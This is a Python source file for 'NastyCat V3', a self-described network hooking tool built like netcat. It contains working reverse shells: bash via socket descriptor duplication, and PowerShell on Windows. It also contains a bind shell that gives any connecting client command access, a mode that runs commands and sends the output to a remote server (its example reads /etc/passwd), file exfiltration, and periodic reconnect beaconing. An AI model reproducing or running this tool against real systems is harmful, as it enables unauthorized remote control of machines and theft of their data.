#!/usr/bin/python3

import os
import sys
import time
import select
import socket
import argparse
import threading
import subprocess

def decode(string):

	# decode string (if possible) and return it

	try: return string.decode()
	except: return string

def exec(cmd):

    # execute a command on localhost

	proc = subprocess.Popen(cmd, shell=1, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	if cmd[:3] == 'cd ':
		os.chdir(cmd[3:].replace('\n', ''))
	return decode(proc.stdout.read() + proc.stderr.read())

def recv(sock):

	# receive data from a socket

	data = b''
	while 1:
		buf = sock.recv(1024)
		data += buf
		if len(buf) < 1024: break

	return data.replace(b'\r', b'')

def getoutput(sock):

	# print data from socket

	while 1:
		r, _, _ = select.select([sock], [], [])
		if sock in r: print(decode(recv(sock)), end='')

def shell(sock):

	# provide a shell

	client, addr = sock.accept()
	if args.verbose:
		print(f"[*] Received connection from {addr}")
		print("[+] Granted access to the local shell.\n")

	while 1:
		if client.send(b'%s> ' % os.getcwd().encode()) <= 0: break
		cmd = decode(recv(client))
		output = exec(cmd)
		if client.sendall(output.encode()) <= 0: break
	shell(sock)

class WinRev:

	# windows reverse shell handling

	def __init__(self, sock):
		self.sock = sock
		self.proc = subprocess.Popen(['powershell'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

	def recv(self):
		while 1:
			data = self.sock.recv(1024)
			if data:
				self.proc.stdin.write(data)
				self.proc.stdin.flush()

	def send(self):
		while 1:
			if self.sock.send(self.proc.stdout.read(1)) <= 0: break

class NastyCat:

	# main network hooker class

	def __init__(self, args):
		self.args = args
		self.piped = not os.isatty(sys.stdin.fileno())
		self.sock = socket.socket()
		self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
	def exchange(self, client):
		threading.Thread(target=getoutput, args=[client,], daemon=1).start()
		try:
			while 1:
				time.sleep(0.1)
				r, w, _ = select.select([], [client], [])
				if client in w:
					data = sys.stdin.read() if self.piped else input() + '\n'
					if client.send(data.encode()) <= 0: break
					time.sleep(0.1)
		except:
			raise SystemExit
			exit()

	def listen(self):

		# listening mode

		self.sock.bind((self.args.target, self.args.port))
		self.sock.listen(100)
		if self.args.verbose:
			print("[+] Listening started on %s:%d" & (self.args.target, self.args.port))

		if self.args.exec:

			# executing the given command and sending the command's output

			out = exec(self.args.exec).encode()
			while 1:
				client, addr = self.sock.accept()
				print(f"[*] Received connection from {addr}")
				if client.send(out) <= 0: continue
				client.close()

		if self.args.upload:

			# getting client data and saving it to a file

			client, addr = self.sock.accept()
			if self.args.verbose:
				print(f"[*] Received connection from {addr}")

			data = recv(client)
			file = open(self.args.upload, "wb")
			file.write(data)
			client.close()
			self.sock.close()
			if self.args.verbose:
				print("[*] Received %d bytes from %s" % (len(data), addr))
				print("[+] File saved as %s" % self.args.upload)

		elif self.args.shell: shell(self.sock)

		else:
			try:
				while 1:
					client, addr = self.sock.accept()
					if self.args.verbose:
						print(f"[*] Received connection from {addr}")

					threading.Thread(target=self.exchange, args=[client,], daemon=1).start()
			except:
				raise SystemExit
				exit()

	def remote(self):

		# connect to server

		self.sock.settimeout(2)
		self.sock.connect((self.args.target, self.args.port))

		if self.args.verbose:
			print("[*] Connected to %s:%d" % (self.args.target, self.args.port))

		self.sock.settimeout(None)

		if self.args.upload:
			contents = open(self.args.upload.name, "rb").read()
			self.sock.settimeout(5)
			if self.sock.send(contents) <= 0: exit()
			print(decode(recv(self.sock)), end='')
			self.sock.close()

		elif self.args.exec:
			out = exec(self.args.exec).encode()
			self.sock.settimeout(5)
			self.sock.send(out)
			print(decode(recv(self.sock)), end='')
			self.sock.close()

		elif self.args.shell:
			if os.name == "nt":
				winrev = WinRev(self.sock)
				threading.Thread(target=winrev.recv, daemon=1).start()
				winrev.send()

			else:
				os.dup2(self.sock.fileno(), 0)
				os.dup2(self.sock.fileno(), 1)
				os.dup2(self.sock.fileno(), 2)
				subprocess.call(["/bin/bash", "-i"])

		else: self.exchange(self.sock)

def args():
	parser = argparse.ArgumentParser(description="NastyCat V3. A network hooking tool.", usage="%(prog)s <target ip> <target port> [options]", formatter_class=argparse.RawDescriptionHelpFormatter, epilog='''Examples:
  %(prog)s 10.10.10.15 4455 # connect to provided address in simple client mode (default)
  %(prog)s -l 1337 # listen on 0.0.0.0:1337 for incoming connections
  %(prog)s -sl 1337 # provide shell access to any client.
  %(prog)s -e "cat /etc/passwd" 10.10.10.15 4455 # execute the command and send the output to the server
  %(prog)s -u file.txt -l 8080 # receive all the output and store it into the provided file
                                     
Like these, all the options has 2 modes. One server side while 1 client side.''')
    
	parser._positionals.title = "positionals"
	parser._optionals.title = "optionals"

	target = parser.add_argument("target", help="target IP or Domain.")
	parser.add_argument("port", help="target port.", type=int)
	parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode on.")
	parser.add_argument("-l", "--listen", action="store_true", help="Listening mode on.")
	parser.add_argument("-s", "--shell", action="store_true", help="Sending servers or providing clients local shells.")
	upload = parser.add_argument("-u", "--upload", help="Upload contents from or save data from clients to a given file.", metavar='')
	parser.add_argument("-e", "--exec", help="Execute a command and send the output to a server or to connecting clients.", metavar='')
	parser.add_argument("-p", "--periodic", action="store_true", help="Connect periodically to the provided server.")
	parser.add_argument("-t", "--timeout", help="Periodic timeout for periodic connect mode. (default: 120 secs)", type=int, default=120, metavar='')

	if "-l" in sys.argv or "--listen" in sys.argv:
		target.nargs = '?'
		target.default = "0.0.0.0"
	else:
		upload.type = argparse.FileType('r')

	args = parser.parse_args()
	assert args.port > 0 and args.port < 65536

	if args.listen and args.periodic:
		sys.stderr.write("[X] Error: Periodic connect mode can't be run along with listening mode.\n")
		exit()

	return args

def run(nastycat):
	global attempt

	if args.listen:
		try: nastycat.listen()
		except:
			raise SystemExit
			exit()

	elif args.periodic:
		if args.verbose:
			print("[*] Attempt to connect: %d" % attempt)
			attempt += 1

		try: nastycat.remote()
		except (ConnectionRefusedError, ConnectionAbortedError):
			time.sleep(args.timeout)
			run(nastycat)

	else:
		nastycat.remote()

if __name__ == "__main__":
	args = args()
	try:
		nastycat = NastyCat(args)
		attempt = 1
		run(nastycat)

	except socket.timeout:
		sys.stderr.write("[X] Error: Timeout occured.\n")
		raise SystemExit
		exit()

	except:
		raise SystemExit
		exit()
